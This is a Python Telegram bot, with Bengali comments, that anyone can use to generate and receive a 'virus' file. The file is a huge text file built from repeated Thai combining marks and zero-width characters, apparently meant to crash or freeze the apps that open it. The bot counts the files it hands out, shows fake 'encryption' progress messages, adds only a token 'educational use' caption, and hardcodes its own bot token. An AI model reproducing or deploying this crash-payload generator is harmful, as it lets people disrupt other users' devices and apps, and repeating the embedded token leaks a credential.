import logging
import sqlite3
import os
import asyncio
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ১. লগিং সেটআপ (সার্ভার মনিটরিং এর জন্য)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ২. কনফিগারেশন (আপনার লেটেস্ট টোকেন)
TOKEN = "8675593212:AAFrbsGfvuO8ld-5FYGv1a5y0975NMDmkes"

# ৩. ডেটাবেস সেটআপ
def init_db():
    conn = sqlite3.connect('m_r_developer_final_v8.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. পেলোড তৈরির শক্তিশালী ফাংশন (লাইভ আপডেটসহ)
async def generate_virus_file(status_msg):
    filename = "M_R_DEVELOPER_VIRUS.txt"
    # শক্তিশালী ক্যারেক্টার প্যাটার্ন
    crash_pattern = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 35
    invisible_mass = "\u200B\u200C\u200D\uFEFF" * 25
    chunk = (crash_pattern + invisible_mass) * 500
    
    try:
        await status_msg.edit_text("⏳ ডাটাবেস লোড হচ্ছে (২০%)...")
        with open(filename, "w", encoding="utf-8") as f:
            for i in range(1, 1201):
                f.write(chunk)
                if i == 400:
                    await status_msg.edit_text("⏳ পেলোড রাইট হচ্ছে (৫০%)...")
                elif i == 800:
                    await status_msg.edit_text("⏳ ফাইল এনক্রিপশন হচ্ছে (৮০%)...")
        
        await status_msg.edit_text("✅ ১০০% সম্পন্ন! ফাইল পাঠানো হচ্ছে...")
        return filename
    except Exception as e:
        logger.error(f"Error: {e}")
        return None

# ৫. মেসেজ হ্যান্ডলার (সবার জন্য উন্মুক্ত)
async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return

    text = update.message.text
    user_name = update.effective_user.first_name

    # স্টার্ট কমান্ড
    if text == "/start":
        keyboard = [
            [KeyboardButton("🚀 CREATE VIRUS")],
            [KeyboardButton("📊 STATUS")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, persistent=True)
        
        welcome_text = (
            f"🔥 **M R DEVELOPER ULTIMATE PANEL** 🔥\n\n"
            f"হ্যালো {user_name}!\n"
            "বটটি এখন সচল। বাটনগুলো আপনার কিবোর্ডের উপরে সেট করা হয়েছে।"
        )
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

    # ভাইরাস ফাইল তৈরি
    elif text == "🚀 CREATE VIRUS":
        status_msg = await update.message.reply_text("🚀 প্রসেস শুরু হয়েছে...")
        
        file_path = await generate_virus_file(status_msg)
        
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as doc:
                    await update.message.reply_document(
                        document=doc,
                        caption=(
                            "🔥 **M R DEVELOPER VIRUS FILE** 🔥\n\n"
                            "✅ সফলভাবে তৈরি হয়েছে।\n"
                            "⚠️ শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে ব্যবহার করুন।"
                        ),
                        parse_mode='Markdown'
                    )
                
                # স্ট্যাটাস আপডেট
                conn = sqlite3.connect('m_r_developer_final_v8.db')
                cur = conn.cursor()
                cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                conn.commit()
                conn.close()
                
            except Exception as e:
                await update.message.reply_text(f"❌ এরর: {str(e)}")
            finally:
                if os.path.exists(file_path):
                    os.remove(file_path)
        
        await status_msg.delete()

    # স্ট্যাটাস চেক
    elif text == "📊 STATUS":
        conn = sqlite3.connect('m_r_developer_final_v8.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total = cur.fetchone()[0]
        conn.close()
        await update.message.reply_text(f"📊 **বট রিপোর্ট**\n\nমোট তৈরি ভাইরাস ফাইল: {total} টি।")

# ৬. মেইন রানার
def main():
    init_db()
    
    # Conflict সমাধান করতে drop_pending_updates=True ব্যবহার করা হয়েছে
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start_dummy)) # dummy handler for /start
    application.add_handler(MessageHandler(filters.TEXT, handle_interaction))
    
    print("Bot is LIVE for M R DEVELOPER...")
    application.run_polling(drop_pending_updates=True)

async def start_dummy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # This is captured by handle_interaction anyway
    pass

if __name__ == '__main__':
    main()
